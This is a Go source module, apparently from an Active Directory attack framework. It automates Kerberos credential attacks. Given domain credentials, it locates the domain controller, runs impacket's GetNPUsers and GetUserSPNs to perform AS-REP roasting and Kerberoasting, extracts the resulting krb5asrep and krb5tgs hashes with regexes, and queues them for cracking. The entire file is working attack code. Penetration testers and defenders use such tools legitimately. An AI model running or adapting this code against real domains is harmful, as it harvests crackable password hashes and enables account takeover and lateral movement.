package modules

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"adpack/core"
	"adpack/utils"
)

func RunKerberos(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, _ := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for Kerberos operations")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "kerberos", Key: "error", Value: "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	// Use DC IP for Kerberos operations, fall back to target host
	dcIP := targetHost
	if dc := findDC(state, domain); dc.IP != "" {
		dcIP = dc.IP
	}

	asrep := runASREPRoast(domain, user, pass, dcIP)
	result.Creds = append(result.Creds, asrep.Creds...)
	result.Evidence = append(result.Evidence, asrep.Evidence...)
	result.Users = append(result.Users, asrep.Users...)

	spn := runKerberoast(domain, user, pass, dcIP)
	result.Creds = append(result.Creds, spn.Creds...)
	result.Evidence = append(result.Evidence, spn.Evidence...)
	result.Users = append(result.Users, spn.Users...)

	return result
}

func runASREPRoast(domain, user, pass, target string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	fmt.Printf("[*] AS-REP roasting against %s...\n", target)
	args := []string{fmt.Sprintf("%s/%s:%s", domain, user, pass)}
	if target != "" {
		args = append(args, "-dc-ip", target)
	}
	args = append(args, "-request")

	r := utils.RunCommand("impacket-GetNPUsers", args...)
	if !r.Success {
		fmt.Printf("[!] AS-REP roast failed: %s\n", r.Stderr)
		result.Success = false
		return result
	}

	re := regexp.MustCompile(`\$krb5asrep\$[^$]*\$([A-Za-z0-9._-]+)@([A-Za-z0-9.-]+)`)
	matches := re.FindAllStringSubmatch(r.Stdout, -1)
	for _, m := range matches {
		if len(m) < 3 {
			continue
		}
		username := m[1]
		userDomain := strings.ToLower(m[2])
		result.Users = append(result.Users, core.User{
			Username: username, Domain: userDomain,
			Source: "asrep_roast", NoPreauth: true,
		})
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "asrep_roast", Key: username + "@" + userDomain,
			Value:     "AS-REP roastable - no preauth required",
			Timestamp: time.Now(),
		})
		result.Creds = append(result.Creds, roastHashCredential(username, userDomain, m[0], "asrep_roast"))
		if EnqueueHash != nil {
			EnqueueHash("krb5asrep", m[0], username, userDomain)
		}
	}
	fmt.Printf("[+] AS-REP: %d roastable users found\n", len(matches))
	return result
}

func runKerberoast(domain, user, pass, target string) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	fmt.Printf("[*] Kerberoasting against %s...\n", target)
	args := []string{fmt.Sprintf("%s/%s:%s", domain, user, pass)}
	if target != "" {
		args = append(args, "-dc-ip", target)
	}
	args = append(args, "-request")

	r := utils.RunCommand("impacket-GetUserSPNs", args...)
	if !r.Success {
		fmt.Printf("[!] Kerberoast failed: %s\n", r.Stderr)
		result.Success = false
		return result
	}

	// Parse SPN table rows
	re := regexp.MustCompile(`^(\S+)\s+(\S+)`)
	lines := strings.Split(r.Stdout, "\n")
	inTable := false
	tgsRe := regexp.MustCompile(`\$krb5tgs\$[^$]*\$([A-Za-z0-9._-]+)@([A-Za-z0-9.-]+)`)
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "ServicePrincipalName") {
			inTable = true
			continue
		}
		if !inTable || trimmed == "" || strings.HasPrefix(trimmed, "-") {
			continue
		}
		m := re.FindStringSubmatch(trimmed)
		if len(m) < 3 {
			continue
		}
		spn := m[1]
		username := m[2]
		result.Users = append(result.Users, core.User{
			Username: username, Domain: domain,
			SPNs: spn, Source: "kerberoast",
		})
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "kerberoast", Key: username + "@" + domain,
			Value: spn, Timestamp: time.Now(),
		})
		// Check if the line also contains a TGS hash
		tgsMatch := tgsRe.FindStringSubmatch(trimmed)
		if len(tgsMatch) >= 3 {
			hashUsername := tgsMatch[1]
			hashDomain := strings.ToLower(tgsMatch[2])
			result.Creds = append(result.Creds, roastHashCredential(hashUsername, hashDomain, tgsMatch[0], "kerberoast"))
			if EnqueueHash != nil {
				EnqueueHash("krb5tgs", tgsMatch[0], hashUsername, hashDomain)
			}
		}
	}
	// Also scan for TGS hashes anywhere in the output (impacket dumps them after the table)
	tgsMatches := tgsRe.FindAllStringSubmatch(r.Stdout, -1)
	for _, m := range tgsMatches {
		if len(m) < 3 {
			continue
		}
		hashUsername := m[1]
		hashDomain := strings.ToLower(m[2])
		// Dedup against already-captured users
		alreadyCaptured := false
		for _, u := range result.Users {
			if u.Username == hashUsername {
				alreadyCaptured = true
				break
			}
		}
		if alreadyCaptured {
			continue
		}
		result.Users = append(result.Users, core.User{
			Username: hashUsername, Domain: hashDomain,
			Source: "kerberoast",
		})
		result.Creds = append(result.Creds, roastHashCredential(hashUsername, hashDomain, m[0], "kerberoast"))
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "kerberoast", Key: hashUsername + "@" + hashDomain,
			Value: "Kerberoastable account", Timestamp: time.Now(),
		})
		if EnqueueHash != nil {
			EnqueueHash("krb5tgs", m[0], hashUsername, hashDomain)
		}
	}
	fmt.Printf("[+] Kerberoast: %d SPN accounts found\n", len(result.Users))
	return result
}

func roastHashCredential(username, domain, hash, source string) core.Credential {
	return core.Credential{
		Type:     core.CredHash,
		Username: username,
		Domain:   domain,
		Hash:     hash,
		Source:   source,
	}
}
